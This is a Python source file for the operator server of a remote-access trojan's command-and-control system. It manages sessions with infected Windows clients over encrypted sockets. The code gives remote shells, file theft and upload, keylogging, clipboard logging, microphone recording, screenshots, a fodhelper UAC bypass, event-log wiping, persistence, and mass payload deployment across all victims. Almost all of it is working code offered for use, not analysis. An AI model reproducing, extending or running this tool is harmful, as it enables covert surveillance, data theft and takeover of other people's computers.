import json
import os
import socket
import sys
import threading
import time
from datetime import datetime
from Crypto.Cipher import AES

user = os.getlogin()
socket_key = b"x\x83\xe1RW\xff\xf1k\xbf\x94\xdef\x88\x8fn\x13:\x9f\xf4\xa5\xf7\x93\xf0l"    # Default key. Place your AES key here 16, 24 or 32 bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lock = threading.Lock()
heart = threading.Lock()
clients = {}

heartbeat_signal = 0xFEEDBEEFFACE
header_size = 6

def encrypt(data):
    cipher = AES.new(socket_key, AES.MODE_CTR)
    nonce = cipher.nonce
    encrypted_content = cipher.encrypt(data)
    return nonce + encrypted_content


def decrypt(data):
    nonce = data[:8]
    encrypted_data = data[8:]
    cipher = AES.new(socket_key, AES.MODE_CTR, nonce=nonce)
    decrypted_content = cipher.decrypt(encrypted_data)
    return decrypted_content


def param_parser(command):
    flags = []
    argument = command.split()
    for flag in argument[:]:
        if flag.startswith('-'):
            flags.append(flag)
            argument.remove(flag)

    command = ' '.join(argument)
    return flags, command


def clean_input(text):
    non_allowed_char = [{'"': 2}, {"'": 2}]
    non_allowed_text = ['download', 'upload', 'search', 'deploy',
                        'kill', 'elevate', 'interact', 'update',
                        'update_all', 'broadcast']

    for remove in non_allowed_char:
        for item, times in remove.items():
            file_path = text.replace(item, '', times).strip()
            text = file_path
    text = text.split(maxsplit=1)

    if text[0] in non_allowed_text:
        if len(text) > 1:
            return text[1]

        else:
            return ''

    else:
        return text[0]


def buffer_recv_data(socket_object):
    while True:
        header = b''
        while len(header) < header_size:
            chunk = socket_object.recv(header_size - len(header))
            if not chunk:
                raise ConnectionError

            header += chunk
        data_length = int.from_bytes(header, 'big')

        if data_length == heartbeat_signal:
            continue

        encrypted_data = b''
        while len(encrypted_data) < data_length:
            encrypted_data += socket_object.recv(data_length - len(encrypted_data))

        return decrypt(encrypted_data)


def buffer_send_data(data, sock):
    data = data.encode() if isinstance(data, str) else data
    data = encrypt(data)
    length_str = len(data).to_bytes(header_size, 'big')
    sock.send(length_str + data)

class SingleServer:
    def __init__(self, socket_obj, session_id):
        self.socket_obj = socket_obj
        self.hostname = self.get_hostname()
        self.session_id = session_id
        self.external_ip = self.get_external_ip()
        self.recording = threading.Event()

    def stream_recv_data(self, file_path):
        try:
            with open(file_path, 'wb') as file:
                while True:
                    data = buffer_recv_data(self.socket_obj)
                    if b'<EOF>' in data:
                        data, _ = data.split(b'<EOF>')
                        file.write(data)
                        return True

                    file.write(data)

        except ConnectionError:
            return False

    def stream_send_data(self, file_path):
        with open(file_path, 'rb') as file:
            while chunk := file.read(4096):
                buffer_send_data(chunk, self.socket_obj)
            buffer_send_data(b'<EOF>', self.socket_obj)

    @staticmethod
    def help_me():
        print(f"{'=' * 35}INFO{'=' * 35}\n"
              "help ==> Open this menu\n"
              f"{'-' * 64}\n"
              "cd ==> Change directory\n"
              f"{'-' * 64}\n"
              "check_priv ==> Check for admin privileges\n"
              f"{'-' * 64}\n"
              "execute ==> Execute command on target\n"
              "  --DISPLAY: Show output\n"
              "  --LOG: Save output to file\n"
              f"{'-' * 64}\n"
              "exit ==> Exit and close connection\n"
              f"{'-' * 64}\n"
              "download ==> Download file from target\n"
              f"{'-' * 64}\n"
              "upload ==> Upload file to target\n"
              f"{'-' * 64}\n"
              "ls ==> List current directory\n"
              f"{'-' * 64}\n"
              "pwd ==> Show current directory\n"
              f"{'-' * 64}\n"
              "list_proc ==> List running processes\n"
              f"{'-' * 64}\n"
              "screenshot ==> Capture screenshot\n"
              f"{'-' * 64}\n"
              "search ==> Search for files\n"
              "  Usage: search .txt C:\\\n"
              f"{'-' * 64}\n"
              "cmd ==> Interactive shell (cmd/powershell)\n"
              f"{'-' * 64}\n"
              "start_keylogger ==> Start keylogger\n"
              f"{'-' * 64}\n"
              "stop_keylogger ==> Stop keylogger and dump logs\n"
              f"{'-' * 64}\n"
              "start_cliplogger ==> Start clipboard logger\n"
              f"{'-' * 64}\n"
              "stop_cliplogger ==> Stop clipboard logger and dump\n"
              f"{'-' * 64}\n"
              "record_mic ==> Record audio\n"
              "  Usage: record_mic <seconds>\n"
              f"{'-' * 64}\n"
              "stop_recording ==> Stop ongoing recording\n"
              f"{'-' * 64}\n"
              "clear_logs ==> Clear Windows event logs (admin only)\n"
              f"{'-' * 64}\n"
              "persist ==> Add persistence\n"
              f"{'-' * 64}\n"
              "update ==> Update client\n"
              f"{'-' * 64}\n"
              "self_destruct ==> Remove client and traces\n"
              f"{'-' * 64}\n"
              "bg ==> Background this session\n"
              f"{'-' * 64}\n"
              f"{'=' * 74}\n"
              )

    def chdir(self):
        data = buffer_recv_data(self.socket_obj)
        if data == b'1':
            print('[-] Access is denied')

        if data == b'2':
            print('[-] Invalid directory')
        return

    def get_hostname(self):
        buffer_send_data(b'initialize_hostname', self.socket_obj)
        hostname = buffer_recv_data(self.socket_obj).decode()
        return hostname

    def get_external_ip(self):
        buffer_send_data(b'initialize_get_ip', self.socket_obj)
        ip = buffer_recv_data(self.socket_obj)
        return ip

    def get_client_version(self):
        buffer_send_data(b'initialize_version', self.socket_obj)
        version_number = buffer_recv_data(self.socket_obj)
        return version_number

    def get_perms(self):
        buffer_send_data(b'initialize_get_perms', self.socket_obj)
        perms = buffer_recv_data(self.socket_obj)
        return perms

    def get_current_user(self):
        buffer_send_data(b'initialize_current_user', self.socket_obj)
        current_user = buffer_recv_data(self.socket_obj)
        return current_user

    @staticmethod
    def elevate(socket_obj):
        print('[*] Attempting elevation')
        buffer_send_data(b'check_elevation_status', socket_obj)
        status = buffer_recv_data(socket_obj)
        if status == b'valid':
            print('[+] Elevation successful. Restarting as SYSTEM...')

        else:
            print('[-] Elevation failed')

    def search(self, command):
        try:
            text = clean_input(command)
            params = text.split(' ')
            if len(params) != 2:
                if len(params) < 2:
                    print('[-] Incomplete parameters')

                elif len(params) > 2:
                    print('[-] Invalid parameters')

                buffer_send_data(b'invalid', self.socket_obj)
                return

            buffer_send_data(b'valid', self.socket_obj)
            print('[*] Searching')
            dir_exist, results = buffer_recv_data(self.socket_obj).split(b' ', 1)
            results = json.loads(results)
            if dir_exist == b'valid':
                line = '-' * 100
                print(f'Found {len(results)} results...')
                print(line)

                for item in results:
                    print(item)
                print(line + '\n')

        except ValueError:
            print('[-] Invalid directory')

    def download(self, command, path, verbose):
        filename = os.path.basename(clean_input(command))
        path = filename if not path else path
        is_file = buffer_recv_data(self.socket_obj)
        has_perms = buffer_recv_data(self.socket_obj)

        if is_file == b'valid' and has_perms == b'valid':
            if verbose:
                print(f'[*] Downloading from {self.hostname}')

            complete = self.stream_recv_data(path)

            if not complete:
                if verbose:
                    print('[-] Download failed')

                return 'exit'

            if verbose:
                print('[*] Download complete')

        elif is_file == b'invalid':
            print('[-] File does not exist ')

        elif has_perms == b'invalid':
            print('[-] Access is denied')

    def upload(self, command, verbose):
        command = clean_input(command)
        flags, command = param_parser(command)
        if os.path.isfile(command):
            buffer_send_data(b'valid', self.socket_obj)

        else:
            buffer_send_data(b'invalid', self.socket_obj)
            print(f'[-] {command} is not a valid file')
            return

        has_perms = buffer_recv_data(self.socket_obj)

        if has_perms == b'valid':
            if verbose:
                print(f'[*] Uploading to {self.hostname}')

            self.stream_send_data(command)
            message = buffer_recv_data(self.socket_obj)

            if b' ' in message:
                completed, destination = message.split(b' ', 1)

                if completed == b'valid':
                    if verbose:
                        print('[*] Uploaded')
                    return destination
            else:
                completed = message
                if completed == b'valid':
                    if verbose:
                        print('[*] Uploaded')

        else:
            print('[-] Access is denied')
            buffer_recv_data(self.socket_obj)

    def updater(self, command):
        command = clean_input(command)
        print(f'[*] Uploading update for {self.hostname}')
        self.upload(command, False)
        status = buffer_recv_data(self.socket_obj).decode()

        if status == 'success':
            print(f'[*] Update uploaded to {self.hostname}. Restarting...')

        return True

    def screenshot(self):
        screenshot_num = 1

        while True:
            path = os.path.join(f'screenshot{screenshot_num}.png')
            if not os.path.exists(path):
                break

            screenshot_num += 1

        with open(path, 'wb') as file:
            data = buffer_recv_data(self.socket_obj)
            file.write(data)
        print('[+] Screenshot taken')

    def process_list(self):
        print('Process list')
        print('=' * 20)
        print(f'{"Pid":<15}{"Name":<15}')
        print(f'{"-" * 10:<15}{"-" * 20:<15}')
        sort = buffer_recv_data(self.socket_obj).decode()
        print(sort)

    def clear_logs(self):
        status = buffer_recv_data(self.socket_obj)
        if status == b'valid':
            print('[*] Clearing logs')

        elif status == b'invalid':
            print('[-] Admin privileges required')

    def start_logging(self, logger):
        data = buffer_recv_data(self.socket_obj).decode()
        if data == '0':
            print(f'[*] {logger} started on {self.hostname}')

        elif data == '1':
            print(f'[*] {logger} is already running on {self.hostname}')

    def stop_logging(self, logger):
        buffer = buffer_recv_data(self.socket_obj)
        if buffer.decode() == '0':
            print(f'[-] {logger} is not running on {self.hostname}')
            return

        else:
            with open(rf'{self.hostname} {logger}_dump.txt', 'wb') as file:
                file.write(buffer_recv_data(self.socket_obj))
                print(f'[+] {logger} dumped from {self.hostname}')
                return

    def recv_recording(self, command):
        param_no = len(command.split())

        if param_no != 2:
            print('[-] Invalid argument')
            return

        if self.recording.is_set():
            print('[*] Already recording')
            return

        self.recording.set()
        audio_number = 1
        filepath = f'{self.hostname}_Audio_file_{audio_number}.wav'

        while True:
            if os.path.exists(filepath):
                audio_number += 1
                filepath = f'{self.hostname}_Audio_file_{audio_number}.wav'

            else:
                break

        file_exists = buffer_recv_data(self.socket_obj)

        if b'exists' in file_exists:
            print('[*] Previous recording found')
            print('[*] Downloading previous recording')
            self.download(filepath, False, False)
            self.recording.clear()
            print('[+] Recording downloaded')
            print('[*] Started recording')

        else:
            print('[*] Started recording')

        while True:
            audio_ready = buffer_recv_data(self.socket_obj)

            if audio_ready == b'ready':
                print('[*] Downloading recording')
                self.download(filepath, False, False)
                self.recording.clear()
                print('[+] Recording downloaded')
                break

    def execute(self, command):
        flags, command = param_parser(command)

        if '--DISPLAY' in flags:
            output = buffer_recv_data(self.socket_obj).decode()
            print(output)

        elif '--LOG' in flags:
            output = buffer_recv_data(self.socket_obj)
            log_num = 1

            while True:
                path = os.path.join(self.hostname.lower() + f'-Log{log_num}.txt')
                if not os.path.exists(path):
                    break

                log_num += 1

            with open(path, 'wb') as file:
                file.write(output)
            print(rf'[+] Module logged from {self.hostname}')

        else:
            print(f'[+] Executed on {self.get_hostname()}')

    def exit_client(self):
        with lock:
            for id_no, conn in list(clients.items()):
                if conn[1] == self.socket_obj:
                    buffer_send_data(b'exit', self.socket_obj)
                    print(f'[*] Connection closed {self.hostname} {clients.get(self.session_id)[0]}')
                    clients.pop(id_no)
                    return

    def cmd_shell(self, prompt):
        kill_process = threading.Event()

        def recv_cmd_output():
            while True:
                try:
                    chunk = buffer_recv_data(self.socket_obj)

                    if kill_process.is_set():
                        print('[*] Exiting shell')
                        break

                    print(f"\r{' ' * len(prompt)}\r{chunk.decode().strip()}\n{prompt}", end='')

                except ConnectionError:
                    return

        receiving_thread = threading.Thread(target=recv_cmd_output, daemon=True)
        receiving_thread.start()

        while True:
            try:
                cmd_input = input(f'\r{prompt}')
                if cmd_input:
                    buffer_send_data(cmd_input.encode(), self.socket_obj)

                if cmd_input == 'powershell':
                    prompt = 'powershell> '

                elif cmd_input == 'cmd':
                    prompt = 'cmd> '

                elif cmd_input == 'exit':
                    kill_process.set()
                    receiving_thread.join()
                    break

                continue
            except ConnectionError:
                print('[-] A connection error as occurred')
                return

    def main_shell(self):
        try:
            while True:
                command = input('\rAufheben: ')
                if command:
                    buffer_send_data(command.strip().encode(), self.socket_obj)

                if command.startswith('help'):
                    self.help_me()

                elif command.startswith('cd'):
                    self.chdir()

                elif command.startswith('ls'):
                    print(buffer_recv_data(self.socket_obj).decode())

                elif command.startswith('pwd'):
                    print(buffer_recv_data(self.socket_obj).decode())

                elif command.startswith('execute'):
                    self.execute(command)

                elif command.startswith('exit'):
                    self.exit_client()
                    return

                elif command.startswith('bg'):
                    return

                elif command.startswith('download'):
                    error = self.download(command, False, True)
                    if error == 'exit':
                        self.socket_obj.close()
                        return

                elif command.startswith('upload'):
                    self.upload(command, True)

                elif command.startswith('record_mic'):
                    self.recv_recording(command)

                elif command.startswith('stop_recording'):
                    if not self.recording.is_set():
                        print('[*] Not recording')
                        continue

                    else:
                        self.recording.clear()
                        print('[*] Stopped recording')

                elif command.startswith('update'):
                    self.updater(command)

                elif command.startswith('cmd'):
                    self.cmd_shell('cmd> ')

                elif command.startswith('self_destruct'):
                    print(buffer_recv_data(self.socket_obj).decode())
                    return

                elif command.startswith('check_priv'):
                    print(buffer_recv_data(self.socket_obj).decode())

                elif command.startswith('clear_logs'):
                    self.clear_logs()

                elif command.startswith('screenshot'):
                    self.screenshot()

                elif command.startswith('list_proc'):
                    self.process_list()

                elif command.startswith('search'):
                    self.search(command)

                elif command.startswith('check_version'):
                    print(f'Client version : {buffer_recv_data(self.socket_obj).decode()}')

                elif command.startswith('start_keylogger'):
                    self.start_logging('Keylogger')

                elif command.startswith('stop_keylogger'):
                    self.stop_logging('Keylogger')

                elif command.startswith('start_cliplogger'):
                    self.start_logging('Cliplogger')

                elif command.startswith('stop_cliplogger'):
                    self.stop_logging('Cliplogger')

                continue

        except ConnectionError:
            print('[*] An error has occurred, restarting...')
            return


class MultiServerControl:
    prompt = 'C2 Server: '
    date = datetime.now
    in_session = False

    def help_me(self):
        print(f"{'=' * 70}\n"
              f"INFO\n"
              f"{'=' * 70}\n"
              "help ==> Open this menu\n"
              f"{'-' * 64}\n"
              "sessions ==> List active sessions\n"
              f"{'-' * 64}\n"
              "interact <id> ==> Interact with session\n"
              f"{'-' * 64}\n"
              "elevate <id> ==> Attempt UAC bypass on session\n"
              f"{'-' * 64}\n"
              "elevate_all ==> Attempt UAC bypass on all sessions\n"
              f"{'-' * 64}\n"
              "kill <id> ==> Terminate session\n"
              f"{'-' * 64}\n"
              "deploy <file> ==> Upload and execute on all sessions\n"
              "  --DISPLAY: Show output\n"
              "  --LOG: Save output\n"
              "  --DELETE: Remove after execution\n"
              f"{'-' * 64}\n"
              "broadcast <cmd> ==> Execute command on all sessions\n"
              f"{'-' * 64}\n"
              "start_loggers ==> Start keylogger and clipboard on all\n"
              f"{'-' * 64}\n"
              "stop_loggers ==> Stop all loggers and dump\n"
              f"{'-' * 64}\n"
              "update_all <file> ==> Update all clients\n"
              f"{'-' * 64}\n"
              "quit ==> Exit server\n"
              f"{'-' * 74}\n"
              )

    def tidy_up_socket(self, sock):
        with lock:
            for id_no, conn in list(clients.items()):
                if conn[1] == sock:
                    clients.pop(id_no)
                    if not self.in_session:
                        print(f'\r[-] Connection died - {conn[3]} ({conn[0]})\n', end='')

    def heartbeat(self, sock):
        with heart:
            try:
                while True:
                    header = (heartbeat_signal).to_bytes(header_size, 'big')
                    sock.sendall(header)
                    time.sleep(5)

            except ConnectionError:
                self.tidy_up_socket(sock)
                return

            except OSError:
                return

    def multi_listener(self):
        sock.bind(('127.0.0.1', 80
                   ))
        sock.listen()

        while True:
            try:
                connect, addr = sock.accept()
                if not self.in_session:
                    print(f'\r[*] Opening connection')

                time.sleep(1)
                buffer_send_data(b'<IniTialiZe>', connect)
                threading.Thread(target=self.heartbeat, args=(connect,)).start()
                host = SingleServer(connect, max(clients.keys(), default=0))
                client_name = host.hostname
                client_ip = f"{host.external_ip.decode()}: {connect.getpeername()[1]}"
                perms = host.get_perms().decode()
                perms = 'ADMIN' if perms == '1' else 'USER'
                client_version = host.get_client_version().decode()
                current_user = host.get_current_user().decode()

                with lock:
                    clients[max(clients.keys(), default=0) + 1] = (
                        client_ip, connect, self.date().strftime("%Y-%m-%d %H:%M:%S"),
                        client_name, perms, client_version, current_user)

                if not self.in_session:
                    print(
                        f'\r[+] Connection opened - {client_name} ({client_ip})\n{self.prompt}',
                        end='')

            except ConnectionError:
                if not self.in_session:
                    print('[-] Failed to open connection')
                continue

    def start_listeners(self):
        threading.Thread(target=self.multi_listener, daemon=True).start()
        print('[*] Started listener')

    @staticmethod
    def get_socks():
        socket_objects = [clients.get(sock)[1] for sock in clients.keys()]
        return socket_objects

    def interact(self, command):
        try:
            session_id = clean_input(command)
            session_id = int(session_id)
            socket_obj = clients.get(session_id)[1]

        except ValueError:
            print('[-] Invalid session id')
            return

        try:
            host = SingleServer(socket_obj, session_id)
            self.in_session = True
            host.main_shell()
            self.in_session = False

        except ConnectionError:
            self.tidy_up_socket(socket_obj)
            self.in_session = False

    def fodhelper_elevate(self, command):
        try:
            session_id = int(clean_input(command))
            socket_obj = clients.get(session_id)[1]

            try:
                host = SingleServer(socket_obj, session_id)
                host.elevate(socket_obj)

            except ConnectionError:
                self.tidy_up_socket(socket_obj)
                return

        except ValueError:
            print('[-] Invalid parameter')

    def elevate_all(self):
        with lock:
            for sock in self.get_socks():
                host = SingleServer(sock, 0)
                host.elevate(sock)

    def update_all(self, command):
        with lock:
            command = clean_input(command)
            if os.path.isfile(command):
                for sock in self.get_socks():
                    host = SingleServer(sock, 0)
                    buffer_send_data(f'update {command}'.encode(), host.socket_obj)
                    host.updater(command)
            else:
                print('[*] Invalid parameter')
                return

    def kill_session(self, command):
        try:
            session_id = int(clean_input(command))
            conn = clients.get(session_id)[1]
            host = SingleServer(conn, session_id)
            host.exit_client()

        except ValueError:
            print('[-] Input session id')

        except TypeError:
            print('[-] Invalid session id')

    def manage_loggers(self, action):
        with lock:
            for sock in self.get_socks():
                host = SingleServer(sock, 0)
                if action == 'start':
                    buffer_send_data(b'keyscan_start', host.socket_obj)
                    host.start_logging('Keylogger')
                    buffer_send_data(b'clipscan_start', host.socket_obj)
                    host.start_logging('Cliplogger')

                elif action == 'stop':
                    buffer_send_data(b'keyscan_stop', host.socket_obj)
                    host.stop_logging('Keylogger')
                    buffer_send_data(b'clipscan_stop', host.socket_obj)
                    host.stop_logging('Cliplogger')

    def deploy_execute(self, command):
        flags, command = param_parser(command)
        acceptable_params = ['--DISPLAY', '--LOG', '--DELETE']
        invalid = set(flags) - set(acceptable_params)
        delete_flag = '--DELETE' if '--DELETE' in flags else ''

        if invalid:
            print('[-] Invalid parameter')
            return

        with lock:
            command = clean_input(command)
            for sock in self.get_socks():
                host = SingleServer(sock, 0)
                buffer_send_data(f'upload --cnc --HIDE {command}'.encode(), host.socket_obj)
                new_path = host.upload(command, True).decode()
                print(new_path)

                if '--DISPLAY' in flags or '--LOG' in flags:
                    buffer_send_data(f'execute --cnc {flags[0]} {delete_flag} {new_path}'.encode(), host.socket_obj)
                    host.execute(f'{flags[0]} {new_path}')

                else:
                    print(new_path)
                    buffer_send_data(f'execute --cnc {delete_flag} {new_path}'.encode(), host.socket_obj)
                    host.execute(f'{new_path}')

    def broadcast(self, command):
        with lock:
            command = clean_input(command)
            for sock in self.get_socks():
                host = SingleServer(sock, 0)
                buffer_send_data(f'execute {command}'.encode(), host.socket_obj)
                print(f'[*] Broadcasted {command} ')

    def command_control(self):
        while True:
            try:
                command = input(self.prompt)

                if command.startswith('sessions'):
                    # Define column widths
                    col_id = 6
                    col_host = 20
                    col_user = 20
                    col_ip = 30
                    col_time = 20
                    col_priv = 12
                    col_ver = 10

                    # Header border
                    print(
                        '+' + '-' * (col_id + col_host + col_user + col_ip + col_time + col_priv + col_ver + 13) + '+')
                    print(
                        f"| {'ID':<{col_id}} | {'PC-NAME':<{col_host}} | {'User':<{col_user}} | {'IP:Port':<{col_ip}} | {'Connected':<{col_time}} | {'Privs':<{col_priv}} | {'Ver':<{col_ver}} |")
                    print(
                        '+' + '-' * (col_id + col_host + col_user + col_ip + col_time + col_priv + col_ver + 13) + '+')

                    for sess_id, conn_data in clients.items():
                        ip = conn_data[0]
                        hostname = conn_data[3]
                        user = conn_data[6]
                        time_started = conn_data[2]
                        privilege = conn_data[4]
                        version = conn_data[5]
                        print(
                            f"| {sess_id:<{col_id}} | {hostname:<{col_host}} | {user:<{col_user}} | {ip:<{col_ip}} | {time_started:<{col_time}} | {privilege:<{col_priv}} | {version:<{col_ver}} |")

                    print(
                        '+' + '-' * (col_id + col_host + col_user + col_ip + col_time + col_priv + col_ver + 13) + '+')

                elif command.startswith('interact'):
                    try:
                        self.interact(command)

                    except (TypeError, IndexError):
                        print('[-] This session id is invalid')

                elif command.startswith('start_loggers'):
                    self.manage_loggers('start')

                elif command.startswith('stop_loggers'):
                    self.manage_loggers('stop')

                elif command.startswith('quit'):
                    return

                elif command.startswith('help'):
                    self.help_me()

                elif command.startswith('deploy'):
                    self.deploy_execute(command)

                elif command.startswith('elevate_all'):
                    self.elevate_all()

                elif command.startswith('elevate'):
                    self.fodhelper_elevate(command)

                elif command.startswith('broadcast'):
                    self.broadcast(command)

                elif command.startswith('update_all'):
                    self.update_all(command)

                elif command.startswith('kill'):
                    self.kill_session(command)

                continue

            except ConnectionError:
                print('[-] Error! socket probably died')

            except KeyboardInterrupt:
                sys.exit()


def main():
    try:
        server = MultiServerControl()
        server.start_listeners()
        server.command_control()

    except Exception as err:
        raise err


if __name__ == '__main__':

    main()
